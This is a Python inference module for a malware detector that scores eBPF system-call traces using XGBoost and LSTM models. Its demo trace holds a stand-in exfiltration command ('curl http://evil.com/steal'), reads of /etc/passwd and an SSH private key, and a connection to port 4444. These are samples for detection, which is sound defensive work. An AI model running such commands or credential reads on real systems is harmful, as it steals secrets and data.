"""
Inference Module for Real-time Malware Detection

This module provides:
1. Single sample prediction
2. Batch prediction
3. Real-time eBPF trace analysis (integration point)
"""

import os
import sys
import pickle
import numpy as np
from pathlib import Path
from typing import Dict, List, Any, Tuple, Optional
import torch

# Add project root
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from src.preprocessing.trace_parsers import UnifiedTraceParser
from src.features.feature_extractor import FeatureExtractor
from src.utils.helpers import load_json, load_config


class MalwareDetector:
    """
    Unified malware detector that can use XGBoost, LSTM, or ensemble.
    
    Usage:
        detector = MalwareDetector()
        detector.load_models('trained_models')
        
        # Predict from raw trace data
        result = detector.predict_from_traces(trace_data)
        
        # Or predict from features
        result = detector.predict(features)
    """
    
    def __init__(self, model_type: str = 'ensemble'):
        """
        Initialize detector.
        
        Args:
            model_type: 'xgboost', 'lstm', or 'ensemble'
        """
        self.model_type = model_type
        self.xgboost_model = None
        self.lstm_model = None
        self.lstm_vocab = None
        self.feature_extractor = None
        self.feature_names = None
        self.trace_parser = UnifiedTraceParser()
        self.device = 'cuda' if torch.cuda.is_available() else 'cpu'
        
    def load_models(self, models_dir: str = 'trained_models'):
        """Load trained models."""
        # Load XGBoost
        xgb_path = os.path.join(models_dir, 'xgboost_latest.pkl')
        if os.path.exists(xgb_path):
            with open(xgb_path, 'rb') as f:
                data = pickle.load(f)
            self.xgboost_model = data['model']
            self.feature_names = data['feature_names']
            print(f"Loaded XGBoost model from {xgb_path}")
        
        # Load LSTM
        lstm_path = os.path.join(models_dir, 'lstm_latest.pt')
        if os.path.exists(lstm_path):
            from src.models.train_lstm import BiLSTMClassifier, SyscallVocabulary
            
            checkpoint = torch.load(lstm_path, map_location=self.device)
            
            # Restore vocabulary
            self.lstm_vocab = SyscallVocabulary(
                min_freq=checkpoint['vocab']['min_freq']
            )
            self.lstm_vocab.token2idx = checkpoint['vocab']['token2idx']
            self.lstm_vocab.idx2token = {
                int(v): k for k, v in self.lstm_vocab.token2idx.items()
            }
            
            # Restore model
            config = checkpoint['config']
            lstm_config = config.get('lstm', {})
            
            self.lstm_model = BiLSTMClassifier(
                vocab_size=len(self.lstm_vocab),
                embedding_dim=lstm_config.get('embedding_dim', 64),
                hidden_dim=lstm_config.get('hidden_dim', 128),
                num_layers=lstm_config.get('num_layers', 2),
                dropout=lstm_config.get('dropout', 0.3),
            ).to(self.device)
            
            self.lstm_model.load_state_dict(checkpoint['model_state_dict'])
            self.lstm_model.eval()
            print(f"Loaded LSTM model from {lstm_path}")
        
        # Initialize feature extractor
        self.feature_extractor = FeatureExtractor()
    
    def predict_xgboost(
        self, 
        features: np.ndarray
    ) -> Tuple[np.ndarray, np.ndarray]:
        """
        Predict using XGBoost model.
        
        Returns:
            (predictions, probabilities)
        """
        if self.xgboost_model is None:
            raise ValueError("XGBoost model not loaded!")
        
        predictions = self.xgboost_model.predict(features)
        probabilities = self.xgboost_model.predict_proba(features)[:, 1]
        
        return predictions, probabilities
    
    def predict_lstm(
        self, 
        sequences: List[List[str]],
        max_length: int = 500
    ) -> Tuple[np.ndarray, np.ndarray]:
        """
        Predict using LSTM model.
        
        Returns:
            (predictions, probabilities)
        """
        if self.lstm_model is None:
            raise ValueError("LSTM model not loaded!")
        
        self.lstm_model.eval()
        
        all_preds = []
        all_probs = []
        
        with torch.no_grad():
            for seq in sequences:
                # Encode sequence
                encoded = self.lstm_vocab.encode(seq)
                
                # Truncate or pad
                if len(encoded) > max_length:
                    encoded = encoded[:max_length]
                else:
                    encoded = encoded + [0] * (max_length - len(encoded))
                
                # Convert to tensor
                input_ids = torch.tensor([encoded], dtype=torch.long).to(self.device)
                
                # Predict
                logits = self.lstm_model(input_ids)
                probs = torch.softmax(logits, dim=1)
                pred = torch.argmax(logits, dim=1)
                
                all_preds.append(pred.cpu().item())
                all_probs.append(probs[0, 1].cpu().item())
        
        return np.array(all_preds), np.array(all_probs)
    
    def predict_ensemble(
        self,
        features: np.ndarray,
        sequences: List[List[str]],
        xgb_weight: float = 0.6,
        lstm_weight: float = 0.4
    ) -> Tuple[np.ndarray, np.ndarray]:
        """
        Ensemble prediction combining XGBoost and LSTM.
        
        Uses weighted average of probabilities.
        """
        _, xgb_probs = self.predict_xgboost(features)
        _, lstm_probs = self.predict_lstm(sequences)
        
        # Weighted average
        ensemble_probs = (xgb_weight * xgb_probs) + (lstm_weight * lstm_probs)
        predictions = (ensemble_probs >= 0.5).astype(int)
        
        return predictions, ensemble_probs
    
    def predict_from_traces(
        self,
        parsed_trace: Dict,
        threshold: float = 0.5
    ) -> Dict[str, Any]:
        """
        Predict from parsed trace data.
        
        Args:
            parsed_trace: Dictionary with parsed trace data
            threshold: Classification threshold
            
        Returns:
            Dictionary with prediction results
        """
        # Extract features
        feature_set = self.feature_extractor.extract_features(parsed_trace)
        
        # Build feature vector
        feature_vector = np.array([[
            feature_set.numeric_features.get(name, 0.0)
            for name in self.feature_names
        ]], dtype=np.float32)
        
        # Get sequence
        sequences = [feature_set.syscall_sequence]
        
        # Predict based on model type
        if self.model_type == 'xgboost':
            preds, probs = self.predict_xgboost(feature_vector)
        elif self.model_type == 'lstm':
            preds, probs = self.predict_lstm(sequences)
        else:  # ensemble
            if self.xgboost_model and self.lstm_model:
                preds, probs = self.predict_ensemble(feature_vector, sequences)
            elif self.xgboost_model:
                preds, probs = self.predict_xgboost(feature_vector)
            else:
                preds, probs = self.predict_lstm(sequences)
        
        # Build result
        is_malicious = probs[0] >= threshold
        
        result = {
            'package_name': parsed_trace.get('package_name', 'unknown'),
            'is_malicious': bool(is_malicious),
            'malicious_probability': float(probs[0]),
            'confidence': float(abs(probs[0] - 0.5) * 2),  # 0-1 scale
            'risk_level': self._get_risk_level(probs[0]),
            'key_indicators': self._get_key_indicators(feature_set),
        }
        
        return result
    
    def _get_risk_level(self, prob: float) -> str:
        """Convert probability to risk level."""
        if prob < 0.3:
            return 'LOW'
        elif prob < 0.5:
            return 'MEDIUM'
        elif prob < 0.7:
            return 'HIGH'
        else:
            return 'CRITICAL'
    
    def _get_key_indicators(self, feature_set) -> List[str]:
        """Extract key risk indicators from features."""
        indicators = []
        
        nf = feature_set.numeric_features
        
        if nf.get('file_sensitive_access_count', 0) > 0:
            indicators.append(f"Accessed {int(nf['file_sensitive_access_count'])} sensitive files")
        
        if nf.get('file_sensitive_ssh_keys', 0) > 0:
            indicators.append("Attempted SSH key access")
        
        if nf.get('file_sensitive_credentials', 0) > 0:
            indicators.append("Attempted credential file access")
        
        if nf.get('net_suspicious_port_count', 0) > 0:
            indicators.append(f"Connected to {int(nf['net_suspicious_port_count'])} suspicious ports")
        
        if nf.get('net_external_connections', 0) > 5:
            indicators.append("Multiple external network connections")
        
        if nf.get('pattern_exfil_indicators', 0) > 0:
            indicators.append("Potential data exfiltration behavior")
        
        if nf.get('pattern_obfusc_indicators', 0) > 0:
            indicators.append("Code obfuscation detected")
        
        if nf.get('file_hidden_files', 0) > 3:
            indicators.append("Created multiple hidden files")
        
        return indicators


def main():
    """Demo inference on sample data."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Run inference')
    parser.add_argument('--models-dir', type=str, default='trained_models',
                        help='Directory containing trained models')
    parser.add_argument('--model-type', type=str, default='ensemble',
                        choices=['xgboost', 'lstm', 'ensemble'],
                        help='Model type to use')
    args = parser.parse_args()
    
    print("="*60)
    print("eBPF Malware Detector - Inference Demo")
    print("="*60)
    
    # Initialize detector
    detector = MalwareDetector(model_type=args.model_type)
    detector.load_models(args.models_dir)
    
    # Example trace (for demo)
    sample_trace = {
        'package_name': 'test_package',
        'label': 0,
        'file_operations': [
            {'operation': 'open', 'filepath': '/etc/passwd'},
            {'operation': 'read', 'filepath': '/etc/passwd', 'bytes_count': 1024},
            {'operation': 'open', 'filepath': '/home/user/.ssh/id_rsa'},
        ],
        'network_operations': [
            {'operation': 'connect', 'dst_ip': '192.168.1.100', 'dst_port': 4444},
        ],
        'process_info': [],
        'patterns': {
            'raw_lines': ['curl http://evil.com/steal', 'base64 -d'],
            'syscall_counts': {'open': 5, 'read': 10, 'write': 3}
        },
        'total_events': 20
    }
    
    # Run prediction
    result = detector.predict_from_traces(sample_trace)
    
    print(f"\nPackage: {result['package_name']}")
    print(f"Malicious: {result['is_malicious']}")
    print(f"Probability: {result['malicious_probability']:.2%}")
    print(f"Risk Level: {result['risk_level']}")
    print(f"Confidence: {result['confidence']:.2%}")
    
    if result['key_indicators']:
        print("\nKey Indicators:")
        for ind in result['key_indicators']:
            print(f"  - {ind}")


if __name__ == '__main__':
    main()
